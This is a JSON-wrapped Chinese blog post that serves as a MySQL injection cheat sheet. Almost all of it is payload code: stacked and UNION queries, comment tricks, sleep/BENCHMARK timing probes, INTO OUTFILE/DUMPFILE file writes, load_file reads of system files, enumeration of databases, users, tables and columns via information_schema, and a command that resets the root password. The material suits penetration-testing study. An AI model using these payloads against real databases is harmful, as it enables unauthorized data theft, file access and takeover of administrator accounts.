{"title":"MySQL","slug":"MySQL","date":"2020-02-22T12:39:59.311Z","updated":"2020-02-22T12:41:35.091Z","comments":true,"path":"api/articles/MySQL.json","photos":[],"link":"","excerpt":"MySQL注入基本特性查看版本:​    @@version1<br>2<br>3<br>select * from testdb.users where id&#x3D;1 and(1&#x3D;1);select @@version;<br>select * from testdb.users where id&#x3D;1 and(1&#x3D;select@@version);<br>select * from testdb.users union select 6,@@version,&#39;aa&#39;;<br>注释符:","covers":null,"content":"<h2 id=\"MySQL注入\"><a href=\"#MySQL注入\" class=\"headerlink\" title=\"MySQL注入\"></a>MySQL注入</h2><h3 id=\"基本特性\"><a href=\"#基本特性\" class=\"headerlink\" title=\"基本特性\"></a>基本特性</h3><h4 id=\"查看版本\"><a href=\"#查看版本\" class=\"headerlink\" title=\"查看版本:\"></a><strong>查看版本:</strong></h4><p>​    @@version</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from testdb.users where id&#x3D;1 and(1&#x3D;1);select @@version;</span><br><span class=\"line\">select * from testdb.users where id&#x3D;1 and(1&#x3D;select@@version);</span><br><span class=\"line\">select * from testdb.users union select 6,@@version,&#39;aa&#39;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注释符\"><a href=\"#注释符\" class=\"headerlink\" title=\"注释符:\"></a><strong>注释符:</strong><a id=\"more\"></a></h4><p>​    –  # /**/</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from testdb.users where id&#x3D;1 and 1&#x3D;1;-- comment 注意有个空格</span><br><span class=\"line\">select * from testdb.users where id&#x3D;1 and 1&#x3D;1;#comment</span><br><span class=\"line\">select * from testdb.users where id&#x3D;1 and&#x2F;*comment*&#x2F;1&#x3D;1;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"时间延迟：\"><a href=\"#时间延迟：\" class=\"headerlink\" title=\"时间延迟：\"></a><strong>时间延迟：</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from testdb.users where id&#x3D;1 union select 2,sleep(1),&#39;a&#39;;</span><br><span class=\"line\">select * from testdb.users where id&#x3D;1;select BENCHMARK(1000000,MD5(&#39;A&#39;));#重复执行1000000次MD5(&#39;A&#39;) 约1.8秒</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"写入文件：\"><a href=\"#写入文件：\" class=\"headerlink\" title=\"写入文件：\"></a><strong>写入文件：</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union select 1,1,1 into outfile &#39;&#x2F;tmp&#x2F;demo.txt&#39;;</span><br><span class=\"line\">union select 1,1,1 into dumpfile &#39;C:\\\\demo.txt&#39;;</span><br><span class=\"line\">&#x2F;*dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏*&#x2F;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"读文件：\"><a href=\"#读文件：\" class=\"headerlink\" title=\"读文件：\"></a><strong>读文件：</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select @@datadir;</span><br><span class=\"line\">select load_file(&#39;C:\\\\windows\\\\win.ini&#39;);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"当前数据库\"><a href=\"#当前数据库\" class=\"headerlink\" title=\"当前数据库:\"></a><strong>当前数据库:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select database();</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"列出数据库\"><a href=\"#列出数据库\" class=\"headerlink\" title=\"列出数据库:\"></a><strong>列出数据库:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select schema_name FROM information_schema.schemata; #schema多个表（数据库对象）的集合 理解为数据库database</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"当前用户\"><a href=\"#当前用户\" class=\"headerlink\" title=\"当前用户:\"></a><strong>当前用户:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select user();</span><br><span class=\"line\">select system_user();</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"列出用户\"><a href=\"#列出用户\" class=\"headerlink\" title=\"列出用户:\"></a><strong>列出用户:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select user FROM mysql.user;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"列出表：\"><a href=\"#列出表：\" class=\"headerlink\" title=\"列出表：\"></a><strong>列出表：</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select table_schema,table_name FROM information_schema.tables WHERE table_schema &#x3D; &#39;testdb&#39; and table_schema !&#x3D; &#39;mysql&#39; AND table_schema !&#x3D; &#39;information_schema&#39;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"列出列：\"><a href=\"#列出列：\" class=\"headerlink\" title=\"列出列：\"></a><strong>列出列：</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema &#x3D; &#39;testdb&#39; and table_name &#x3D; &#39;users&#39; and table_schema !&#x3D; &#39;mysql&#39; AND table_schema !&#x3D; &#39;information_schema&#39;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ASCII\"><a href=\"#ASCII\" class=\"headerlink\" title=\"ASCII:\"></a><strong>ASCII:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select char(0x27); -- &#39;</span><br><span class=\"line\">select ascii(&#39;&#39;&#39;&#39;); -- &#39;</span><br><span class=\"line\">select 0x414227; -- AB&#39;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"if\"><a href=\"#if\" class=\"headerlink\" title=\"if:\"></a><strong>if:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select if(1&#x3D;1,&#39;foo&#39;,&#39;bar&#39;);-- 返回foo</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"更改用户密码：\"><a href=\"#更改用户密码：\" class=\"headerlink\" title=\"更改用户密码：\"></a><strong>更改用户密码</strong>：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -e &quot;UPDATE mysql.user SET password&#x3D;PASSWORD(&#39;123456&#39;) WHERE user&#x3D;&#39;root&#39;;FLUSH PRIVILEGES;&quot; -p</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]}